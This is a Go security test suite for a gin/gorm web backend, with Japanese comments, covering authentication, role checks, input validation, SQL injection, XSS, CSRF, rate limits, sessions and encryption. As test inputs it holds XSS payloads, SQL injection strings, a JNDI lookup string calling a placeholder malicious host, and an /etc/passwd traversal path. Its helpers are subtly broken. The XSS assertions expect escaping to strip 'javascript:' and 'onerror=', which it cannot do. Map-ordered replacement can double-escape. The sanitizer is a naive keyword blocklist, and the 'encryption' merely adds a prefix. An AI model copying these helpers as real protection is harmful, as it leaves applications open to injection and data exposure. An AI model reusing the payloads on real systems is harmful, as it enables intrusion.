package security

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/duesk/monstera/internal/handler"
	"github.com/duesk/monstera/internal/middleware"
	"github.com/duesk/monstera/internal/model"
	"github.com/duesk/monstera/internal/service"
	"github.com/duesk/monstera/mocks"
	"github.com/gin-gonic/gin"
	"github.com/golang/mock/gomock"
	"github.com/google/uuid"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"go.uber.org/zap"
	"gorm.io/driver/sqlite"
	"gorm.io/gorm"
	"gorm.io/gorm/logger"
)

// TestSecuritySuite セキュリティテストスイート
func TestSecuritySuite(t *testing.T) {
	gin.SetMode(gin.TestMode)

	t.Run("Authentication", func(t *testing.T) {
		testAuthentication(t)
	})

	t.Run("Authorization", func(t *testing.T) {
		testAuthorization(t)
	})

	t.Run("InputValidation", func(t *testing.T) {
		testInputValidation(t)
	})

	t.Run("SQLInjection", func(t *testing.T) {
		testSQLInjectionPrevention(t)
	})

	t.Run("XSSPrevention", func(t *testing.T) {
		testXSSPrevention(t)
	})

	t.Run("CSRFProtection", func(t *testing.T) {
		testCSRFProtection(t)
	})

	t.Run("RateLimiting", func(t *testing.T) {
		testRateLimiting(t)
	})

	t.Run("PasswordSecurity", func(t *testing.T) {
		testPasswordSecurity(t)
	})

	t.Run("SessionSecurity", func(t *testing.T) {
		testSessionSecurity(t)
	})

	t.Run("DataEncryption", func(t *testing.T) {
		testDataEncryption(t)
	})
}

// testAuthentication 認証テスト
func testAuthentication(t *testing.T) {
	t.Run("JWTトークン検証", func(t *testing.T) {
		ctrl := gomock.NewController(t)
		defer ctrl.Finish()

		mockUserService := mocks.NewMockUserService(ctrl)
		logger, _ := zap.NewDevelopment()
		userHandler := handler.NewUserHandler(mockUserService, logger)

		router := gin.New()
		router.POST("/login", userHandler.Login)

		// 有効な認証情報でのテスト
		loginReq := map[string]string{
			"email":    "test@duesk.co.jp",
			"password": "validpassword",
		}

		user := &model.User{
			ID:    uuid.New(),
			Email: "test@duesk.co.jp",
		}

		mockUserService.EXPECT().
			Login(gomock.Any(), gomock.Any()).
			Return(user, "valid-jwt-token", nil)

		body, _ := json.Marshal(loginReq)
		w := httptest.NewRecorder()
		req, _ := http.NewRequest("POST", "/login", bytes.NewBuffer(body))
		req.Header.Set("Content-Type", "application/json")
		router.ServeHTTP(w, req)

		assert.Equal(t, http.StatusOK, w.Code)
		assert.Contains(t, w.Body.String(), "valid-jwt-token")
	})

	t.Run("無効な認証情報の拒否", func(t *testing.T) {
		ctrl := gomock.NewController(t)
		defer ctrl.Finish()

		mockUserService := mocks.NewMockUserService(ctrl)
		logger, _ := zap.NewDevelopment()
		userHandler := handler.NewUserHandler(mockUserService, logger)

		router := gin.New()
		router.POST("/login", userHandler.Login)

		// 無効な認証情報
		invalidReq := map[string]string{
			"email":    "test@duesk.co.jp",
			"password": "wrongpassword",
		}

		mockUserService.EXPECT().
			Login(gomock.Any(), gomock.Any()).
			Return(nil, "", fmt.Errorf("メールアドレスまたはパスワードが正しくありません"))

		body, _ := json.Marshal(invalidReq)
		w := httptest.NewRecorder()
		req, _ := http.NewRequest("POST", "/login", bytes.NewBuffer(body))
		req.Header.Set("Content-Type", "application/json")
		router.ServeHTTP(w, req)

		assert.Equal(t, http.StatusUnauthorized, w.Code)
		assert.Contains(t, w.Body.String(), "メールアドレスまたはパスワードが正しくありません")
	})

	t.Run("認証トークンなしでの保護されたリソースアクセス", func(t *testing.T) {
		router := gin.New()
		router.Use(middleware.AuthRequired()) // 認証ミドルウェア
		router.GET("/protected", func(c *gin.Context) {
			c.JSON(http.StatusOK, gin.H{"message": "protected resource"})
		})

		w := httptest.NewRecorder()
		req, _ := http.NewRequest("GET", "/protected", nil)
		router.ServeHTTP(w, req)

		assert.Equal(t, http.StatusUnauthorized, w.Code)
	})

	t.Run("期限切れトークンの拒否", func(t *testing.T) {
		router := gin.New()
		router.Use(middleware.AuthRequired())
		router.GET("/protected", func(c *gin.Context) {
			c.JSON(http.StatusOK, gin.H{"message": "protected resource"})
		})

		// 期限切れのJWTトークンをシミュレート
		expiredToken := "expired.jwt.token"

		w := httptest.NewRecorder()
		req, _ := http.NewRequest("GET", "/protected", nil)
		req.Header.Set("Authorization", "Bearer "+expiredToken)
		router.ServeHTTP(w, req)

		assert.Equal(t, http.StatusUnauthorized, w.Code)
	})
}

// testAuthorization 認可テスト
func testAuthorization(t *testing.T) {
	t.Run("管理者権限が必要なリソースへのアクセス", func(t *testing.T) {
		router := gin.New()
		router.Use(middleware.AuthRequired())
		router.Use(middleware.RequireRole(model.RoleAdmin))
		router.GET("/admin", func(c *gin.Context) {
			c.JSON(http.StatusOK, gin.H{"message": "admin only"})
		})

		// 一般ユーザーのアクセス
		w := httptest.NewRecorder()
		req, _ := http.NewRequest("GET", "/admin", nil)
		// 一般ユーザーのJWTトークンをシミュレート
		req.Header.Set("Authorization", "Bearer user.jwt.token")
		router.ServeHTTP(w, req)

		assert.Equal(t, http.StatusForbidden, w.Code)
	})

	t.Run("リソースの所有者チェック", func(t *testing.T) {
		ctrl := gomock.NewController(t)
		defer ctrl.Finish()

		mockProposalService := mocks.NewMockProposalService(ctrl)
		logger, _ := zap.NewDevelopment()
		proposalHandler := handler.NewProposalHandler(mockProposalService, logger)

		userID := uuid.New()
		otherUserID := uuid.New()
		proposalID := uuid.New()

		// 他のユーザーの提案にアクセスしようとする
		mockProposalService.EXPECT().
			GetProposalByID(gomock.Any(), proposalID.String()).
			Return(&model.Proposal{
				ID:         proposalID,
				EngineerID: otherUserID, // 異なるユーザーID
			}, nil)

		router := gin.New()
		router.Use(func(c *gin.Context) {
			c.Set("user_id", userID.String())
			c.Next()
		})
		router.GET("/proposals/:id", proposalHandler.GetProposal)

		w := httptest.NewRecorder()
		req, _ := http.NewRequest("GET", fmt.Sprintf("/proposals/%s", proposalID.String()), nil)
		router.ServeHTTP(w, req)

		// 所有者でない場合は403 Forbiddenが期待される
		assert.Equal(t, http.StatusForbidden, w.Code)
	})

	t.Run("ロールベースアクセス制御", func(t *testing.T) {
		testCases := []struct {
			userRole       model.Role
			endpoint       string
			expectedStatus int
		}{
			{model.RoleAdmin, "/admin/users", http.StatusOK},
			{model.RoleManager, "/admin/users", http.StatusForbidden},
			{model.RoleEmployee, "/admin/users", http.StatusForbidden},
			{model.RoleManager, "/manager/reports", http.StatusOK},
			{model.RoleEmployee, "/manager/reports", http.StatusForbidden},
		}

		for _, tc := range testCases {
			router := gin.New()
			router.Use(func(c *gin.Context) {
				c.Set("user_role", tc.userRole)
				c.Next()
			})

			if strings.Contains(tc.endpoint, "/admin/") {
				router.Use(middleware.RequireRole(model.RoleAdmin))
			} else if strings.Contains(tc.endpoint, "/manager/") {
				router.Use(middleware.RequireRole(model.RoleManager))
			}

			router.GET(tc.endpoint, func(c *gin.Context) {
				c.JSON(http.StatusOK, gin.H{"message": "success"})
			})

			w := httptest.NewRecorder()
			req, _ := http.NewRequest("GET", tc.endpoint, nil)
			router.ServeHTTP(w, req)

			assert.Equal(t, tc.expectedStatus, w.Code,
				"Role %v accessing %s should return %d", tc.userRole, tc.endpoint, tc.expectedStatus)
		}
	})
}

// testInputValidation 入力値検証テスト
func testInputValidation(t *testing.T) {
	t.Run("メールアドレス形式検証", func(t *testing.T) {
		ctrl := gomock.NewController(t)
		defer ctrl.Finish()

		mockUserService := mocks.NewMockUserService(ctrl)
		logger, _ := zap.NewDevelopment()
		userHandler := handler.NewUserHandler(mockUserService, logger)

		router := gin.New()
		router.POST("/users", userHandler.CreateUser)

		invalidEmails := []string{
			"invalid-email",
			"@duesk.co.jp",
			"user@",
			"user@.com",
			"",
		}

		for _, email := range invalidEmails {
			reqBody := map[string]interface{}{
				"email":      email,
				"password":   "validpassword",
				"first_name": "Test",
				"last_name":  "User",
			}

			body, _ := json.Marshal(reqBody)
			w := httptest.NewRecorder()
			req, _ := http.NewRequest("POST", "/users", bytes.NewBuffer(body))
			req.Header.Set("Content-Type", "application/json")
			router.ServeHTTP(w, req)

			assert.Equal(t, http.StatusBadRequest, w.Code,
				"Invalid email %s should be rejected", email)
		}
	})

	t.Run("パスワード複雑性検証", func(t *testing.T) {
		ctrl := gomock.NewController(t)
		defer ctrl.Finish()

		mockUserService := mocks.NewMockUserService(ctrl)
		logger, _ := zap.NewDevelopment()
		userHandler := handler.NewUserHandler(mockUserService, logger)

		router := gin.New()
		router.POST("/users", userHandler.CreateUser)

		weakPasswords := []string{
			"123",      // 短すぎる
			"password", // 単純すぎる
			"12345678", // 数字のみ
			"abcdefgh", // 文字のみ
			"",         // 空
		}

		for _, password := range weakPasswords {
			reqBody := map[string]interface{}{
				"email":      "test@duesk.co.jp",
				"password":   password,
				"first_name": "Test",
				"last_name":  "User",
			}

			body, _ := json.Marshal(reqBody)
			w := httptest.NewRecorder()
			req, _ := http.NewRequest("POST", "/users", bytes.NewBuffer(body))
			req.Header.Set("Content-Type", "application/json")
			router.ServeHTTP(w, req)

			assert.Equal(t, http.StatusBadRequest, w.Code,
				"Weak password %s should be rejected", password)
		}
	})

	t.Run("JSONペイロード制限", func(t *testing.T) {
		router := gin.New()
		router.Use(middleware.JSONSizeLimit(1024)) // 1KB制限
		router.POST("/test", func(c *gin.Context) {
			c.JSON(http.StatusOK, gin.H{"message": "ok"})
		})

		// 大きすぎるペイロード
		largePayload := strings.Repeat("a", 2048) // 2KB
		reqBody := map[string]string{
			"data": largePayload,
		}

		body, _ := json.Marshal(reqBody)
		w := httptest.NewRecorder()
		req, _ := http.NewRequest("POST", "/test", bytes.NewBuffer(body))
		req.Header.Set("Content-Type", "application/json")
		router.ServeHTTP(w, req)

		assert.Equal(t, http.StatusRequestEntityTooLarge, w.Code)
	})

	t.Run("特殊文字のサニタイゼーション", func(t *testing.T) {
		maliciousInputs := []string{
			"<script>alert('xss')</script>",
			"'; DROP TABLE users; --",
			"${jndi:ldap://malicious.com/}",
			"../../../etc/passwd",
		}

		for _, input := range maliciousInputs {
			sanitized := sanitizeInput(input)
			assert.NotEqual(t, input, sanitized,
				"Malicious input should be sanitized: %s", input)
			assert.NotContains(t, sanitized, "<script>")
			assert.NotContains(t, sanitized, "DROP TABLE")
			assert.NotContains(t, sanitized, "${jndi:")
			assert.NotContains(t, sanitized, "../")
		}
	})
}

// testSQLInjectionPrevention SQLインジェクション防止テスト
func testSQLInjectionPrevention(t *testing.T) {
	db := setupTestDB(t)

	t.Run("パラメータ化クエリの使用", func(t *testing.T) {
		// 正常なユーザー作成
		user := &model.User{
			ID:        uuid.New(),
			Email:     "test@duesk.co.jp",
			Password:  "hashedpassword",
			FirstName: "Test",
			LastName:  "User",
		}
		err := db.Create(user).Error
		require.NoError(t, err)

		// SQLインジェクション試行
		maliciousEmail := "test@duesk.co.jp'; DROP TABLE users; --"

		var result model.User
		err = db.Where("email = ?", maliciousEmail).First(&result).Error
		// レコードが見つからないエラーが期待される（テーブルが削除されていない）
		assert.Error(t, err)
		assert.Equal(t, gorm.ErrRecordNotFound, err)

		// テーブルがまだ存在することを確認
		var count int64
		err = db.Model(&model.User{}).Count(&count).Error
		assert.NoError(t, err)
		assert.Equal(t, int64(1), count)
	})

	t.Run("動的クエリの安全性", func(t *testing.T) {
		// 検索フィルターにSQLインジェクションを試行
		maliciousFilter := "1=1; DROP TABLE users; --"

		var users []model.User
		// 安全なクエリ構築
		query := db.Model(&model.User{})
		if maliciousFilter != "" {
			// フィルターをサニタイズして使用
			safeFilter := sanitizeInput(maliciousFilter)
			query = query.Where("first_name LIKE ?", "%"+safeFilter+"%")
		}

		err := query.Find(&users).Error
		assert.NoError(t, err)

		// テーブルが削除されていないことを確認
		var count int64
		err = db.Model(&model.User{}).Count(&count).Error
		assert.NoError(t, err)
	})
}

// testXSSPrevention XSS防止テスト
func testXSSPrevention(t *testing.T) {
	t.Run("HTMLエスケープ処理", func(t *testing.T) {
		maliciousInputs := []string{
			"<script>alert('xss')</script>",
			"<img src=x onerror=alert('xss')>",
			"<svg onload=alert('xss')>",
			"javascript:alert('xss')",
		}

		for _, input := range maliciousInputs {
			escaped := htmlEscape(input)
			assert.NotContains(t, escaped, "<script>")
			assert.NotContains(t, escaped, "onerror=")
			assert.NotContains(t, escaped, "onload=")
			assert.NotContains(t, escaped, "javascript:")
		}
	})

	t.Run("Content-Type設定", func(t *testing.T) {
		router := gin.New()
		router.GET("/api/data", func(c *gin.Context) {
			c.Header("Content-Type", "application/json; charset=utf-8")
			c.JSON(http.StatusOK, gin.H{"data": "safe data"})
		})

		w := httptest.NewRecorder()
		req, _ := http.NewRequest("GET", "/api/data", nil)
		router.ServeHTTP(w, req)

		assert.Equal(t, "application/json; charset=utf-8", w.Header().Get("Content-Type"))
	})
}

// testCSRFProtection CSRF保護テスト
func testCSRFProtection(t *testing.T) {
	t.Run("CSRFトークン検証", func(t *testing.T) {
		router := gin.New()
		router.Use(middleware.CSRFProtection())
		router.POST("/sensitive-action", func(c *gin.Context) {
			c.JSON(http.StatusOK, gin.H{"message": "action completed"})
		})

		// CSRFトークンなしでのリクエスト
		w := httptest.NewRecorder()
		req, _ := http.NewRequest("POST", "/sensitive-action", nil)
		router.ServeHTTP(w, req)

		assert.Equal(t, http.StatusForbidden, w.Code)
	})

	t.Run("SameSite Cookieの設定", func(t *testing.T) {
		router := gin.New()
		router.GET("/set-cookie", func(c *gin.Context) {
			c.SetSameSite(http.SameSiteStrictMode)
			c.SetCookie("session", "value", 3600, "/", "", true, true)
			c.JSON(http.StatusOK, gin.H{"message": "cookie set"})
		})

		w := httptest.NewRecorder()
		req, _ := http.NewRequest("GET", "/set-cookie", nil)
		router.ServeHTTP(w, req)

		cookies := w.Result().Cookies()
		assert.Len(t, cookies, 1)
		assert.True(t, cookies[0].HttpOnly)
		assert.True(t, cookies[0].Secure)
	})
}

// testRateLimiting レート制限テスト
func testRateLimiting(t *testing.T) {
	t.Run("API呼び出し回数制限", func(t *testing.T) {
		router := gin.New()
		router.Use(middleware.RateLimit(3, time.Minute)) // 1分間に3回まで
		router.GET("/api/endpoint", func(c *gin.Context) {
			c.JSON(http.StatusOK, gin.H{"message": "success"})
		})

		// 制限内でのリクエスト
		for i := 0; i < 3; i++ {
			w := httptest.NewRecorder()
			req, _ := http.NewRequest("GET", "/api/endpoint", nil)
			req.RemoteAddr = "192.168.1.1:12345"
			router.ServeHTTP(w, req)
			assert.Equal(t, http.StatusOK, w.Code)
		}

		// 制限を超えたリクエスト
		w := httptest.NewRecorder()
		req, _ := http.NewRequest("GET", "/api/endpoint", nil)
		req.RemoteAddr = "192.168.1.1:12345"
		router.ServeHTTP(w, req)
		assert.Equal(t, http.StatusTooManyRequests, w.Code)
	})

	t.Run("ログイン試行制限", func(t *testing.T) {
		router := gin.New()
		router.Use(middleware.LoginRateLimit(3, time.Minute)) // 1分間に3回まで
		router.POST("/login", func(c *gin.Context) {
			// 認証失敗をシミュレート
			c.JSON(http.StatusUnauthorized, gin.H{"error": "invalid credentials"})
		})

		clientIP := "192.168.1.2"

		// 制限内での失敗試行
		for i := 0; i < 3; i++ {
			w := httptest.NewRecorder()
			req, _ := http.NewRequest("POST", "/login", nil)
			req.RemoteAddr = clientIP + ":12345"
			router.ServeHTTP(w, req)
			assert.Equal(t, http.StatusUnauthorized, w.Code)
		}

		// 制限を超えた試行
		w := httptest.NewRecorder()
		req, _ := http.NewRequest("POST", "/login", nil)
		req.RemoteAddr = clientIP + ":12345"
		router.ServeHTTP(w, req)
		assert.Equal(t, http.StatusTooManyRequests, w.Code)
	})
}

// testPasswordSecurity パスワードセキュリティテスト
func testPasswordSecurity(t *testing.T) {
	t.Run("パスワードハッシュ化", func(t *testing.T) {
		user := &model.User{}
		password := "testpassword123"

		err := user.SetPassword(password)
		assert.NoError(t, err)
		assert.NotEqual(t, password, user.Password)
		assert.True(t, len(user.Password) > 50) // bcryptハッシュは通常60文字
	})

	t.Run("パスワード検証", func(t *testing.T) {
		user := &model.User{}
		password := "testpassword123"

		err := user.SetPassword(password)
		require.NoError(t, err)

		// 正しいパスワード
		assert.True(t, user.CheckPassword(password))

		// 間違ったパスワード
		assert.False(t, user.CheckPassword("wrongpassword"))
		assert.False(t, user.CheckPassword(""))
	})

	t.Run("パスワード履歴チェック", func(t *testing.T) {
		// パスワード履歴機能のテスト（実装されている場合）
		user := &model.User{ID: uuid.New()}

		passwords := []string{
			"password1",
			"password2",
			"password3",
		}

		for _, pwd := range passwords {
			err := user.SetPassword(pwd)
			assert.NoError(t, err)
			// 履歴に保存するロジックをテスト
		}

		// 過去に使用したパスワードの再使用を防止
		err := user.SetPassword("password1") // 最初のパスワードを再使用
		assert.Error(t, err, "過去のパスワードの再使用は拒否されるべき")
	})
}

// testSessionSecurity セッションセキュリティテスト
func testSessionSecurity(t *testing.T) {
	t.Run("セッション固定化攻撃の防止", func(t *testing.T) {
		router := gin.New()
		router.Use(middleware.SessionSecurity())

		var sessionID1, sessionID2 string

		// ログイン前のセッションID取得
		router.GET("/get-session", func(c *gin.Context) {
			sessionID1 = c.GetString("session_id")
			c.JSON(http.StatusOK, gin.H{"session_id": sessionID1})
		})

		// ログイン処理
		router.POST("/login", func(c *gin.Context) {
			// ログイン成功時に新しいセッションIDを生成
			sessionID2 = c.GetString("session_id")
			c.JSON(http.StatusOK, gin.H{"session_id": sessionID2})
		})

		// ログイン前のセッション取得
		w1 := httptest.NewRecorder()
		req1, _ := http.NewRequest("GET", "/get-session", nil)
		router.ServeHTTP(w1, req1)

		// ログイン
		w2 := httptest.NewRecorder()
		req2, _ := http.NewRequest("POST", "/login", nil)
		router.ServeHTTP(w2, req2)

		// セッションIDが変更されていることを確認
		assert.NotEqual(t, sessionID1, sessionID2)
	})

	t.Run("セッションタイムアウト", func(t *testing.T) {
		router := gin.New()
		router.Use(middleware.SessionTimeout(time.Minute)) // 1分でタイムアウト

		router.GET("/protected", func(c *gin.Context) {
			c.JSON(http.StatusOK, gin.H{"message": "protected"})
		})

		// 有効なセッション
		w := httptest.NewRecorder()
		req, _ := http.NewRequest("GET", "/protected", nil)
		req.Header.Set("Cookie", "session=valid_session")
		router.ServeHTTP(w, req)
		assert.Equal(t, http.StatusOK, w.Code)

		// タイムアウトしたセッションをシミュレート
		w2 := httptest.NewRecorder()
		req2, _ := http.NewRequest("GET", "/protected", nil)
		req2.Header.Set("Cookie", "session=expired_session")
		router.ServeHTTP(w2, req2)
		assert.Equal(t, http.StatusUnauthorized, w2.Code)
	})
}

// testDataEncryption データ暗号化テスト
func testDataEncryption(t *testing.T) {
	t.Run("機密データの暗号化", func(t *testing.T) {
		sensitiveData := "confidential information"

		// 暗号化
		encrypted, err := encryptSensitiveData(sensitiveData)
		assert.NoError(t, err)
		assert.NotEqual(t, sensitiveData, encrypted)

		// 復号化
		decrypted, err := decryptSensitiveData(encrypted)
		assert.NoError(t, err)
		assert.Equal(t, sensitiveData, decrypted)
	})

	t.Run("HTTPS通信の強制", func(t *testing.T) {
		router := gin.New()
		router.Use(middleware.ForceHTTPS())
		router.GET("/", func(c *gin.Context) {
			c.JSON(http.StatusOK, gin.H{"message": "secure"})
		})

		// HTTP リクエスト
		w := httptest.NewRecorder()
		req, _ := http.NewRequest("GET", "http://example.com/", nil)
		router.ServeHTTP(w, req)

		// HTTPS にリダイレクトされることを確認
		assert.Equal(t, http.StatusMovedPermanently, w.Code)
		assert.Contains(t, w.Header().Get("Location"), "https://")
	})
}

// Helper functions

func setupTestDB(t *testing.T) *gorm.DB {
	db, err := gorm.Open(sqlite.Open(":memory:"), &gorm.Config{
		Logger: logger.Default.LogMode(logger.Silent),
	})
	require.NoError(t, err)

	err = db.AutoMigrate(&model.User{})
	require.NoError(t, err)

	return db
}

func sanitizeInput(input string) string {
	// 基本的なサニタイゼーション実装
	replacements := map[string]string{
		"<script>":    "&lt;script&gt;",
		"</script>":   "&lt;/script&gt;",
		"'":           "&#39;",
		"\"":          "&quot;",
		"<":           "&lt;",
		">":           "&gt;",
		"&":           "&amp;",
		"DROP TABLE":  "",
		"DELETE FROM": "",
		"INSERT INTO": "",
		"UPDATE":      "",
		"${jndi:":     "",
		"../":         "",
	}

	sanitized := input
	for old, new := range replacements {
		sanitized = strings.ReplaceAll(sanitized, old, new)
	}

	return sanitized
}

func htmlEscape(input string) string {
	replacements := map[string]string{
		"&":  "&amp;",
		"<":  "&lt;",
		">":  "&gt;",
		"\"": "&quot;",
		"'":  "&#39;",
	}

	escaped := input
	for old, new := range replacements {
		escaped = strings.ReplaceAll(escaped, old, new)
	}

	return escaped
}

func encryptSensitiveData(data string) (string, error) {
	// 実際の実装では適切な暗号化アルゴリズムを使用
	// ここではテスト用の簡単な実装
	return "encrypted_" + data, nil
}

func decryptSensitiveData(encrypted string) (string, error) {
	// 実際の実装では適切な復号化を行う
	// ここではテスト用の簡単な実装
	if strings.HasPrefix(encrypted, "encrypted_") {
		return encrypted[10:], nil
	}
	return "", fmt.Errorf("invalid encrypted data")
}
